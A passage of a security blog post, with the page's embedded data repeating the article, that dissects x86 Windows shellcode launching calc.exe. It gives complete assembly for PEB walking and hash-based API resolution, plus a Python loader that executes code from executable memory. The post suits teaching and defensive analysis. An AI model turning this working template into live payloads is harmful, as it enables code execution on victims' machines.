<p>This self-referencing approach is a cornerstone of shellcode development, allowing access to code sections without absolute addresses.</p>
<h3>PE Header Navigation: Understanding the Export Table</h3>
<p>With Kernel32.dll's base address in EBX, we can locate its export table to find function addresses:</p>
<pre><code class="language-assembly">find_function:
pushad                          # Save all registers
mov   eax, [ebx+0x3c]           # Get PE header offset
mov   edi, [ebx+eax+0x78]       # Get export directory RVA
add   edi, ebx                  # Convert to actual address
mov   ecx, [edi+0x18]           # Number of functions
mov   eax, [edi+0x20]           # Array of function names
add   eax, ebx                  # Convert to actual address
mov   [ebp-4], eax              # Store for iteration
</code></pre>
<p>This section navigates the Portable Executable (PE) file format structures:</p>
<ol>
<li>First, we find the PE header using the e_lfanew field at offset 0x3C</li>
<li>Then, locate the export directory using the offset at PE+0x78</li>
<li>From the export directory, extract:
<ul>
<li>The number of exported functions</li>
<li>Pointer to the array of function names</li>
<li>Pointers to ordinals and function addresses</li>
</ul>
</li>
</ol>
<p>These offsets are part of the documented PE file format structure, but using them directly in assembly requires familiarity with Windows internals.</p>
<h3>Function Hash Calculation: The ROR-13 Algorithm</h3>
<p>Instead of storing full function names (which would make the shellcode larger), we use a hashing algorithm to identify functions:</p>
<pre><code class="language-assembly">compute_hash:
xor   eax, eax                  # Clear accumulator
cdq                             # Clear EDX (hash value)
cld                             # Clear direction flag

compute_hash_again:
lodsb                           # Load next character into AL
test  al, al                    # Check for null terminator
jz    compute_hash_finished     # If null, we're done
ror   edx, 0x0d                 # Rotate right by 13 bits
add   edx, eax                  # Add character to hash
jmp   compute_hash_again        # Process next character
</code></pre>
<p>This algorithm:</p>
<ol>
<li>Loads each character of the function name one at a time</li>
<li>Rotates the current hash value right by 13 bits</li>
<li>Adds the current character value</li>
<li>Repeats until reaching the null terminator</li>
</ol>
<p>The result is a 32-bit hash that, while not cryptographically secure, provides sufficient uniqueness for function identification. Using function hashes instead of names makes shellcode significantly smaller and more difficult to detect through simple string scanning.</p>
<h3>Finding the Function Address: Export Directory Navigation</h3>
<p>After calculating a hash, we check if it matches our target function:</p>
<pre><code class="language-assembly">find_function_compare:
cmp   edx, [esp+0x24]           # Compare calculated hash with target
jnz   find_function_loop        # If no match, try next function
mov   edx, [edi+0x24]           # Get ordinals table RVA
add   edx, ebx                  # Convert to address
mov   cx,  [edx+2*ecx]          # Get function ordinal
mov   edx, [edi+0x1c]           # Get function addresses table RVA
add   edx, ebx                  # Convert to address
mov   eax, [edx+4*ecx]          # Get function RVA
add   eax, ebx                  # Convert to actual address
mov   [esp+0x1c], eax           # Store in EAX position (for POPAD)
</code></pre>
<p>When a hash match is found, we:</p>
<ol>
<li>Get the function's ordinal from the ordinals table</li>
<li>Use the ordinal to index into the address table</li>
<li>Extract the function's relative virtual address (RVA)</li>
<li>Convert the RVA to an actual virtual address by adding the module base</li>
<li>Store the result where it will end up in EAX after POPAD</li>
</ol>
<p>This translation between name, ordinal, and address follows the PE export table structure, allowing us to resolve any exported function.</p>
<h3>Resolving Required Function Addresses</h3>
<p>With our function resolution mechanism in place, we can find the addresses of the specific functions we need:</p>
<pre><code class="language-assembly">resolve_symbols_kernel32:
push  0x78b5b983                # TerminateProcess hash
call dword ptr [ebp+0x04]       # Call find_function
mov   [ebp+0x10], eax           # Store TerminateProcess address
push  0x16b3fe72                # CreateProcessA hash
call dword ptr [ebp+0x04]       # Call find_function
mov   [ebp+0x18], eax           # Store CreateProcessA address
</code></pre>
<p>Here we resolve two essential functions:</p>
<ol>
<li><strong>TerminateProcess</strong> (hash: 0x78b5b983) - Used for clean shellcode exit</li>
<li><strong>CreateProcessA</strong> (hash: 0x16b3fe72) - Used to launch the calculator</li>
</ol>
<p>These specific hash values were pre-calculated using the same algorithm implemented in our shellcode. The resolved addresses are stored at fixed offsets from our EBP register for later use.</p>
<h2>Crafting Dynamic Data Structures</h2>
<h3>Creating the Program Name on the Stack</h3>
<p>To launch calculator, we need its command line. We create this string directly on the stack:</p>
<pre><code class="language-assembly">launch_calc:
xor   eax, eax                  # Clear EAX register
push  eax                       # Push null terminator (0x00000000)
push  0x6578652e                # Push ".exe" (reversed)
push  0x636c6163                # Push "calc" (reversed)
mov   ebx, esp                  # EBX points to "calc.exe"
</code></pre>
<p>This technique builds a null-terminated string by pushing its components backwards onto the stack. Due to x86's little-endian byte ordering, we must reverse the string segments:</p>
<ul>
<li>"calc" becomes 0x636c6163 (hex representation of ASCII values in reverse)</li>
<li>".exe" becomes 0x6578652e</li>
</ul>
<p>After pushing these values and a null terminator, ESP points to the start of our "calc.exe" string, which we save in EBX.</p>
<h3>Creating the STARTUPINFO Structure</h3>
<p>Windows CreateProcess API requires a STARTUPINFO structure. We create this directly on the stack:</p>
<pre><code class="language-assembly">create_startupinfoa:
xor   eax, eax                  # Clear EAX
# Push 16 zero values for various fields
# [multiple pushes omitted for brevity]
mov   al, 0x44                  # Set cb = 68 (size of STARTUPINFO)
push  eax                       # Push structure size
mov   esi, esp                  # ESI points to STARTUPINFO
</code></pre>
<p>The STARTUPINFO structure has 17 fields, most of which we set to zero for default behavior. The critical field is <code>cb</code> (the first field), which must be set to the structure's size (68 bytes).</p>
<p>By pushing all values onto the stack, we avoid the need for a static data section, keeping our shellcode position-independent and more versatile.</p>
<h2>Executing the Payload: Process Creation</h2>
<h3>Preparing CreateProcessA Parameters</h3>
<p>With our string and structure ready, we prepare to call CreateProcessA:</p>
<pre><code class="language-assembly">call_createprocessa:
mov   eax, esp                  # Get current stack pointer
xor   ecx, ecx                  # Clear ECX
mov   cx, 0x390                 # Set to 912 bytes
sub   eax, ecx                  # Calculate space for PROCESS_INFORMATION
push  eax                       # lpProcessInformation
push  esi                       # lpStartupInfo
xor   eax, eax                  # Clear EAX
push  eax                       # lpCurrentDirectory = NULL
push  eax                       # lpEnvironment = NULL
push  eax                       # dwCreationFlags = 0
inc   eax                       # EAX = 1
push  eax                       # bInheritHandles = TRUE
dec   eax                       # EAX = 0
push  eax                       # lpThreadAttributes = NULL
push  eax                       # lpProcessAttributes = NULL
push  ebx                       # lpCommandLine = "calc.exe"
push  eax                       # lpApplicationName = NULL
</code></pre>
<p>This segment prepares the stack with the 10 parameters required by CreateProcessA:</p>
<ol>
<li>First, we reserve space for the PROCESS_INFORMATION output structure (not by adjusting ESP, but by calculating an address below our current stack)</li>
<li>Then we push parameters in reverse order (standard x86 calling convention)</li>
<li>We use some register tricks (like INC/DEC) to avoid NULL bytes while still creating the values 0 and 1</li>
</ol>
<p>The care taken to avoid NULL bytes is a reminder that shellcode is often used in exploit contexts where string operations might terminate on NULL values.</p>
<h3>Calling the API and Exiting</h3>
<p>Finally, we call CreateProcessA and then terminate our own process:</p>
<pre><code class="language-assembly">call  dword ptr [ebp+0x18]      # Call CreateProcessA

exit_properly:
xor   ecx, ecx                  # Clear ECX
push  ecx                       # uExitCode = 0
push  0xffffffff                # hProcess = -1 (current process)
call  dword ptr [ebp+0x10]      # Call TerminateProcess
</code></pre>
<p>The CreateProcessA call launches calculator using our prepared parameters. Then we call TerminateProcess with:</p>
<ul>
<li>A process handle of 0xFFFFFFFF (-1), which is a special value referring to the current process</li>
<li>An exit code of 0, indicating successful execution</li>
</ul>
<h2>Shellcode Execution Environment</h2>
<p>The Python wrapper around our shellcode performs several key functions:</p>
<pre><code class="language-python"># Allocate executable memory
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

# Copy shellcode to allocated memory
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

# Execute shellcode in a new thread
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

# Wait for thread completion
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
</code></pre>
<ol>
<li>
<p><strong>Memory Allocation</strong>:</p>
<ul>
<li>VirtualAlloc creates a memory block with PAGE_EXECUTE_READWRITE permissions (0x40)</li>
<li>The allocation type (0x3000) combines MEM_COMMIT and MEM_RESERVE flags</li>
</ul>
</li>
<li>
<p><strong>Shellcode Transfer</strong>:</p>
<ul>
<li>RtlMoveMemory copies our shellcode bytes to the allocated memory</li>
<li>This is essentially a memcpy operation</li>
</ul>
</li>
<li>
<p><strong>Execution</strong>:</p>
<ul>
<li>CreateThread creates a new thread with our shellcode as the entry point</li>
<li>WaitForSingleObject blocks until the shellcode thread completes execution</li>
</ul>
</li>
</ol>
<p>This execution model represents a simplified version of how shellcode might be deployed in a real exploit scenario, though actual exploits would inject the shellcode into a vulnerable process rather than running it directly.</p>
<h2>Advanced Techniques and Variations</h2>
<h3>Avoiding Bad Characters</h3>
<p>Our shellcode carefully avoids NULL bytes (0x00), which would terminate string operations in many exploit scenarios. This is achieved through techniques like:</p>
<ul>
<li>Using <code>xor reg, reg</code> instead of <code>mov reg, 0</code></li>
<li>Using two's complement values (like 0xFFFFF9F0 instead of -1600)</li>
<li>Using <code>inc</code>/<code>dec</code> instead of direct moves for small values</li>
<li>Constructing values indirectly</li>
</ul>
<p>For different exploit contexts, other characters might also need to be avoided, requiring additional shellcode engineering.</p>
<h3>Handling ASLR and DEP Protections</h3>
<p>Modern Windows systems implement Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). Our shellcode addresses these:</p>
<ul>
<li><strong>ASLR</strong>: By dynamically finding module addresses through PEB traversal rather than hardcoding</li>
<li><strong>DEP</strong>: Our execution wrapper explicitly allocates memory with execute permissions</li>
</ul>
<p>In real exploit scenarios, additional techniques like Return-Oriented Programming (ROP) might be needed to bypass these protections.</p>
<h3>Alternative Function Resolution Methods</h3>
<p>While our shellcode uses function hashing, other approaches include:</p>
<ol>
<li><strong>Hardcoded offsets</strong>: For specific Windows versions (less portable)</li>
<li><strong>Import table parsing</strong>: Finding functions by walking the Import Address Table</li>
<li><strong>Forward searching</strong>: Scanning memory for function prologues</li>
<li><strong>API hooking</strong>: Replacing existing API calls to intercept execution</li>
</ol>
<p>Each method has trade-offs in terms of size, complexity, and reliability across different system versions.</p>
<h2>Practical Applications and Learning Extensions</h2>
<h3>Security Research Applications</h3>
<p>Understanding shellcode construction is invaluable for:</p>
<ol>
<li><strong>Exploit Development</strong>: Creating custom payloads for penetration testing</li>
<li><strong>Vulnerability Research</strong>: Understanding the impact of memory corruption bugs</li>
<li><strong>Malware Analysis</strong>: Recognizing shellcode patterns in malicious software</li>
<li><strong>Intrusion Detection</strong>: Developing signatures for common shellcode techniques</li>
</ol>
<h3>Study Extensions</h3>
<p>To build on this knowledge, consider exploring:</p>
<ol>
<li><strong>Different Architectures</strong>: Adapting techniques for x64, ARM, or MIPS</li>
<li><strong>Alternative Payloads</strong>: Creating shellcode for different actions (file operations, networking, etc.)</li>
<li><strong>Obfuscation Techniques</strong>: Implementing encryption or metamorphic code to evade detection</li>
<li><strong>Sandbox Evasion</strong>: Adding environmental checks to avoid analysis environments</li>
<li><strong>Cross-Platform Shellcode</strong>: Creating payloads that work across different operating systems</li>
</ol>
<h2>Conclusion</h2>
<p>Our calculator-launching shellcode demonstrates fundamental techniques critical to understanding low-level software security:</p>
<ol>
<li><strong>Position-Independent Code</strong>: Operating without assumptions about memory location</li>
<li><strong>Windows Internal Navigation</strong>: Finding key structures without API assistance</li>
<li><strong>Dynamic Function Resolution</strong>: Locating API functions using hashing techniques</li>
<li><strong>Stack-Based Structure Creation</strong>: Building complex data structures dynamically</li>
<li><strong>Clean Execution Flow</strong>: Properly initializing, executing, and terminating processes</li>
</ol>
<p>These techniques transcend the simple example presented here, forming the foundation for both offensive security research and defensive analysis. Whether you're studying malware, developing exploits for legitimate security testing, or simply seeking a deeper understanding of how software interacts with operating systems, shellcode analysis provides unique insights unavailable through higher-level programming approaches.</p>
<p>By mastering these concepts, you gain not just technical skills but also a deeper appreciation for the intricate dance between code, memory, and the operating system that underpins all computer security.</p>
<hr>
<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>
</div></article></main><footer class="bg-primary/90 border-t border-gray-800"><div class="container py-6"><div class="flex justify-center items-center"><div class="text-sm text-gray-400">© <!-- -->2025<!-- --> Ivan Spiridonov (xbz0n). All rights reserved.</div></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json" crossorigin="">{"props":{"pageProps":{"postData":{"slug":"calculator-shellcode-analysis","contentHtml":"\u003ch1\u003eMastering x86 Shellcode: A Deep Dive into Calculator-Launching Payload Development\u003c/h1\u003e\n\u003ch2\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn the realm of cybersecurity, shellcode represents one of the most fundamental building blocks for both offensive security practitioners and defensive analysts. These compact machine code sequences, traditionally designed to spawn command shells (hence the name), have evolved to perform virtually any programmatic action on a target system.\u003c/p\u003e\n\u003cp\u003eIn this comprehensive analysis, we'll dissect a classic Windows shellcode example that launches the calculator application. While seemingly simple, this example serves as an excellent educational tool, demonstrating critical low-level programming techniques applicable to both security research and software development.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eNote: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts.\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWhy Study Shellcode?\u003c/h2\u003e\n\u003cp\u003eUnderstanding shellcode construction provides several benefits:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eSecurity Research\u003c/strong\u003e: Insight into exploitation techniques and vulnerability analysis\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMalware Analysis\u003c/strong\u003e: Ability to recognize and decode obfuscated malicious code\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLow-Level Programming\u003c/strong\u003e: Mastery of assembly language and operating system internals\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSystem Architecture\u003c/strong\u003e: Deeper understanding of process execution environments\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePerformance Optimization\u003c/strong\u003e: Techniques applicable to high-performance computing\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe calculator-launching example is particularly valuable because it's benign yet demonstrates all the critical elements found in more sophisticated payloads.\u003c/p\u003e\n\u003ch2\u003eThe Complete Shellcode Implementation\u003c/h2\u003e\n\u003cp\u003eBelow is our complete x86 shellcode implementation with detailed annotations. Each section serves a specific purpose in our goal of launching the Windows calculator application without using standard library functions.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003eimport ctypes, struct\nfrom keystone import *\n\nCODE = (\n    \" start:                             \"\n    \"   mov   ebp, esp                  ;\"  # Stack base\n    \"   add   esp, 0xfffff9f0           ;\"  # ~1600 bytes (matches your working one)\n    \" find_kernel32:                     \"\n    \"   xor   ecx, ecx                  ;\"  # ECX = 0\n    \"   mov   esi, fs:[ecx+0x30]        ;\"  # ESI = PEB\n    \"   mov   esi, [esi+0x0C]           ;\"  # ESI = PEB-\u003eLdr\n    \"   mov   esi, [esi+0x1C]           ;\"  # ESI = InInitOrder\n    \" next_module:                       \"\n    \"   mov   ebx, [esi+0x08]           ;\"  # EBX = module base (kernel32.dll)\n    \"   mov   edi, [esi+0x20]           ;\"  # EDI = module name\n    \"   mov   esi, [esi]                ;\"  # Next module\n    \"   cmp   [edi+12*2], cx            ;\"  # Check for kernel32.dll\n    \"   jne   next_module               ;\"\n    \" find_function_shorten:             \"\n    \"   jmp find_function_shorten_bnc   ;\"\n    \" find_function_ret:                 \"\n    \"   pop esi                         ;\"  # ESI = find_function address\n    \"   mov   [ebp+0x04], esi           ;\"  # Store for calls\n    \"   jmp resolve_symbols_kernel32    ;\"\n    \" find_function_shorten_bnc:         \"\n    \"   call find_function_ret          ;\"\n    \" find_function:                     \"\n    \"   pushad                          ;\"\n    \"   mov   eax, [ebx+0x3c]           ;\"\n    \"   mov   edi, [ebx+eax+0x78]       ;\"\n    \"   add   edi, ebx                  ;\"\n    \"   mov   ecx, [edi+0x18]           ;\"\n    \"   mov   eax, [edi+0x20]           ;\"\n    \"   add   eax, ebx                  ;\"\n    \"   mov   [ebp-4], eax              ;\"\n    \" find_function_loop:                \"\n    \"   jecxz find_function_finished    ;\"\n    \"   dec   ecx                       ;\"\n    \"   mov   eax, [ebp-4]              ;\"\n    \"   mov   esi, [eax+ecx*4]          ;\"\n    \"   add   esi, ebx                  ;\"\n    \" compute_hash:                      \"\n    \"   xor   eax, eax                  ;\"\n    \"   cdq                             ;\"\n    \"   cld                             ;\"\n    \" compute_hash_again:                \"\n    \"   lodsb                           ;\"\n    \"   test  al, al                    ;\"\n    \"   jz    compute_hash_finished     ;\"\n    \"   ror   edx, 0x0d                 ;\"\n    \"   add   edx, eax                  ;\"\n    \"   jmp   compute_hash_again        ;\"\n    \" compute_hash_finished:             \"\n    \" find_function_compare:             \"\n    \"   cmp   edx, [esp+0x24]           ;\"\n    \"   jnz   find_function_loop        ;\"\n    \"   mov   edx, [edi+0x24]           ;\"\n    \"   add   edx, ebx                  ;\"\n    \"   mov   cx,  [edx+2*ecx]          ;\"\n    \"   mov   edx, [edi+0x1c]           ;\"\n    \"   add   edx, ebx                  ;\"\n    \"   mov   eax, [edx+4*ecx]          ;\"\n    \"   add   eax, ebx                  ;\"\n    \"   mov   [esp+0x1c], eax           ;\"\n    \" find_function_finished:            \"\n    \"   popad                           ;\"\n    \"   ret                             ;\"\n    \" resolve_symbols_kernel32:          \"\n    \"   push  0x78b5b983                ;\"  # TerminateProcess hash (proven in your working shellcode)\n    \"   call dword ptr [ebp+0x04]       ;\"\n    \"   mov   [ebp+0x10], eax           ;\"  # Store TerminateProcess\n    \"   push  0x16b3fe72                ;\"  # CreateProcessA hash\n    \"   call dword ptr [ebp+0x04]       ;\"\n    \"   mov   [ebp+0x18], eax           ;\"  # Store CreateProcessA\n    \" launch_calc:                       \"\n    \"   xor   eax, eax                  ;\"\n    \"   push  eax                       ;\"  # Null terminator\n    \"   push  0x6578652e                ;\"  # \".exe\"\n    \"   push  0x636c6163                ;\"  # \"calc\"\n    \"   mov   ebx, esp                  ;\"  # EBX = \"calc.exe\"\n    \" create_startupinfoa:               \"\n    \"   xor   eax, eax                  ;\"\n    \"   push  eax                       ;\"  # hStdError\n    \"   push  eax                       ;\"  # hStdOutput\n    \"   push  eax                       ;\"  # hStdInput\n    \"   push  eax                       ;\"  # lpReserved2\n    \"   push  eax                       ;\"  # cbReserved2 \u0026#x26; wShowWindow\n    \"   push  eax                       ;\"  # dwFlags\n    \"   push  eax                       ;\"  # dwFillAttribute\n    \"   push  eax                       ;\"  # dwYCountChars\n    \"   push  eax                       ;\"  # dwXCountChars\n    \"   push  eax                       ;\"  # dwYSize\n    \"   push  eax                       ;\"  # dwXSize\n    \"   push  eax                       ;\"  # dwY\n    \"   push  eax                       ;\"  # dwX\n    \"   push  eax                       ;\"  # lpTitle\n    \"   push  eax                       ;\"  # lpDesktop\n    \"   push  eax                       ;\"  # lpReserved\n    \"   mov   al, 0x44                  ;\"  # cb = 68\n    \"   push  eax                       ;\"\n    \"   push  esp                       ;\"  # ESI = STARTUPINFOA\n    \"   pop   esi                       ;\"\n    \" call_createprocessa:               \"\n    \"   mov   eax, esp                  ;\"  # Current ESP\n    \"   xor   ecx, ecx                  ;\"\n    \"   mov   cx, 0x390                 ;\"  # 912 bytes\n    \"   sub   eax, ecx                  ;\"  # Adjust ESP safely\n    \"   push  eax                       ;\"  # lpProcessInformation\n    \"   push  esi                       ;\"  # lpStartupInfo\n    \"   xor   eax, eax                  ;\"\n    \"   push  eax                       ;\"  # lpCurrentDirectory\n    \"   push  eax                       ;\"  # lpEnvironment\n    \"   push  eax                       ;\"  # dwCreationFlags\n    \"   inc   eax                       ;\"  # EAX = 1\n    \"   push  eax                       ;\"  # bInheritHandles\n    \"   dec   eax                       ;\"  # EAX = 0\n    \"   push  eax                       ;\"  # lpThreadAttributes\n    \"   push  eax                       ;\"  # lpProcessAttributes\n    \"   push  ebx                       ;\"  # lpCommandLine = \"calc.exe\"\n    \"   push  eax                       ;\"  # lpApplicationName\n    \"   call  dword ptr [ebp+0x18]      ;\"  # CreateProcessA\n    \" exit_properly:                     \"\n    \"   xor   ecx, ecx                  ;\"\n    \"   push  ecx                       ;\"  # uExitCode = 0\n    \"   push  0xffffffff                ;\"  # hProcess = -1 (current process)\n    \"   call  dword ptr [ebp+0x10]      ;\"  # TerminateProcess\n)\n\nks = Ks(KS_ARCH_X86, KS_MODE_32)\nencoding, count = ks.asm(CODE)\nprint(\"Encoded %d instructions...\" % count)\n\nsh = b\"\"\nfor e in encoding:\n    sh += struct.pack(\"B\", e)\nshellcode = bytearray(sh)\n\nptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),\n                                          ctypes.c_int(len(shellcode)),\n                                          ctypes.c_int(0x3000),\n                                          ctypes.c_int(0x40))\n\nif not ptr:\n    raise Exception(\"VirtualAlloc failed\")\n\nbuf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)\n\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),\n                                     buf,\n                                     ctypes.c_int(len(shellcode)))\n\nprint(\"Shellcode located at address %s\" % hex(ptr))\ninput(\"...ENTER TO EXECUTE SHELLCODE...\")\n\nht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),\n                                         ctypes.c_int(0),\n                                         ctypes.c_int(ptr),\n                                         ctypes.c_int(0),\n                                         ctypes.c_int(0),\n                                         ctypes.pointer(ctypes.c_int(0)))\n\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow, let's analyze this code in depth to understand how each component works.\u003c/p\u003e\n\u003ch2\u003eThe Architecture of Position-Independent Code\u003c/h2\u003e\n\u003ch3\u003eStack Setup and Basic Initialization\u003c/h3\u003e\n\u003cp\u003eThe shellcode begins by establishing a stable execution environment:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003emov   ebp, esp                  # Save stack pointer\nadd   esp, 0xfffff9f0           # Create ~1600 bytes of stack space\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis initial setup creates a stack frame and reserves a significant amount of space (approximately 1600 bytes) for our operations. What's interesting is the use of a negative value (\u003ccode\u003e0xFFFFF9F0\u003c/code\u003e) to allocate space—a technique employed to avoid NULL bytes in the shellcode, which could terminate string processing in exploits.\u003c/p\u003e\n\u003cp\u003eThe second component is the creation of consistent register states. This is crucial for position-independent code that must function regardless of its memory location:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003exor   ecx, ecx                  # Zero out ECX register\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis simple operation clears ECX without using immediate zero values that would create unwanted NULL bytes in our shellcode.\u003c/p\u003e\n\u003ch3\u003eWindows Internals: The Process Environment Block\u003c/h3\u003e\n\u003cp\u003eNext, we navigate Windows internal structures to find Kernel32.dll, the gateway to most Windows API functions:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003emov   esi, fs:[ecx+0x30]        # Access PEB via FS segment register\nmov   esi, [esi+0x0C]           # PEB-\u003eLdr (loader data)\nmov   esi, [esi+0x1C]           # InInitializationOrderModuleList\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis segment delves into undocumented Windows internals. The FS segment register at offset 0x30 points to the Process Environment Block (PEB), a Windows data structure containing process information. By traversing this structure, we locate the Loader Data Table, which contains information about all loaded modules.\u003c/p\u003e\n\u003cp\u003eThe InInitializationOrderModuleList is particularly useful because Kernel32.dll is typically the second module in this list (ntdll.dll being the first).\u003c/p\u003e\n\u003ch3\u003eKernel32.dll Module Discovery\u003c/h3\u003e\n\u003cp\u003eThe next code block iterates through loaded modules to find Kernel32.dll:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003enext_module:\nmov   ebx, [esi+0x08]           # Store module base address\nmov   edi, [esi+0x20]           # Get module name pointer\nmov   esi, [esi]                # Move to next module in list\ncmp   [edi+12*2], cx            # Check if it's kernel32.dll\njne   next_module               # If not, try next module\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis loop examines each module in the initialization order list. For each module:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eWe grab its base address (stored at offset 0x08)\u003c/li\u003e\n\u003cli\u003eRetrieve a pointer to its name (offset 0x20)\u003c/li\u003e\n\u003cli\u003eMove to the next module in the linked list\u003c/li\u003e\n\u003cli\u003eCheck a specific character in the name string (the 13th character, adjusted for Unicode)\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe comparison at \u003ccode\u003e[edi+12*2]\u003c/code\u003e is checking for the NULL terminator in \"kernel32.dll\" (which is 12 characters long). When found, EBX will contain Kernel32.dll's base address—our key to resolving Windows API functions.\u003c/p\u003e\n\u003ch2\u003eDynamic Function Resolution: The Heart of Shellcode\u003c/h2\u003e\n\u003ch3\u003eThe JMP/CALL/POP Trick for Self-Referencing\u003c/h3\u003e\n\u003cp\u003ePosition-independent code must know its own location, particularly to access embedded data. The shellcode uses a classic JMP/CALL/POP sequence to achieve this:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003efind_function_shorten:\njmp find_function_shorten_bnc   # Jump to the CALL instruction\nfind_function_ret:\npop esi                         # ESI now has address of find_function\nmov [ebp+0x04], esi             # Store for later use\njmp resolve_symbols_kernel32    # Continue execution\nfind_function_shorten_bnc:\ncall find_function_ret          # Push return address (find_function)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis elegant technique:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eJumps to a CALL instruction\u003c/li\u003e\n\u003cli\u003eThe CALL pushes the address of the next instruction (find_function) onto the stack\u003c/li\u003e\n\u003cli\u003ePOP retrieves this address into ESI\u003c/li\u003e\n\u003cli\u003eWe store this address for later function resolution calls\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis self-referencing approach is a cornerstone of shellcode development, allowing access to code sections without absolute addresses.\u003c/p\u003e\n\u003ch3\u003ePE Header Navigation: Understanding the Export Table\u003c/h3\u003e\n\u003cp\u003eWith Kernel32.dll's base address in EBX, we can locate its export table to find function addresses:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003efind_function:\npushad                          # Save all registers\nmov   eax, [ebx+0x3c]           # Get PE header offset\nmov   edi, [ebx+eax+0x78]       # Get export directory RVA\nadd   edi, ebx                  # Convert to actual address\nmov   ecx, [edi+0x18]           # Number of functions\nmov   eax, [edi+0x20]           # Array of function names\nadd   eax, ebx                  # Convert to actual address\nmov   [ebp-4], eax              # Store for iteration\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis section navigates the Portable Executable (PE) file format structures:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eFirst, we find the PE header using the e_lfanew field at offset 0x3C\u003c/li\u003e\n\u003cli\u003eThen, locate the export directory using the offset at PE+0x78\u003c/li\u003e\n\u003cli\u003eFrom the export directory, extract:\n\u003cul\u003e\n\u003cli\u003eThe number of exported functions\u003c/li\u003e\n\u003cli\u003ePointer to the array of function names\u003c/li\u003e\n\u003cli\u003ePointers to ordinals and function addresses\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThese offsets are part of the documented PE file format structure, but using them directly in assembly requires familiarity with Windows internals.\u003c/p\u003e\n\u003ch3\u003eFunction Hash Calculation: The ROR-13 Algorithm\u003c/h3\u003e\n\u003cp\u003eInstead of storing full function names (which would make the shellcode larger), we use a hashing algorithm to identify functions:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003ecompute_hash:\nxor   eax, eax                  # Clear accumulator\ncdq                             # Clear EDX (hash value)\ncld                             # Clear direction flag\n\ncompute_hash_again:\nlodsb                           # Load next character into AL\ntest  al, al                    # Check for null terminator\njz    compute_hash_finished     # If null, we're done\nror   edx, 0x0d                 # Rotate right by 13 bits\nadd   edx, eax                  # Add character to hash\njmp   compute_hash_again        # Process next character\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis algorithm:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eLoads each character of the function name one at a time\u003c/li\u003e\n\u003cli\u003eRotates the current hash value right by 13 bits\u003c/li\u003e\n\u003cli\u003eAdds the current character value\u003c/li\u003e\n\u003cli\u003eRepeats until reaching the null terminator\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe result is a 32-bit hash that, while not cryptographically secure, provides sufficient uniqueness for function identification. Using function hashes instead of names makes shellcode significantly smaller and more difficult to detect through simple string scanning.\u003c/p\u003e\n\u003ch3\u003eFinding the Function Address: Export Directory Navigation\u003c/h3\u003e\n\u003cp\u003eAfter calculating a hash, we check if it matches our target function:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003efind_function_compare:\ncmp   edx, [esp+0x24]           # Compare calculated hash with target\njnz   find_function_loop        # If no match, try next function\nmov   edx, [edi+0x24]           # Get ordinals table RVA\nadd   edx, ebx                  # Convert to address\nmov   cx,  [edx+2*ecx]          # Get function ordinal\nmov   edx, [edi+0x1c]           # Get function addresses table RVA\nadd   edx, ebx                  # Convert to address\nmov   eax, [edx+4*ecx]          # Get function RVA\nadd   eax, ebx                  # 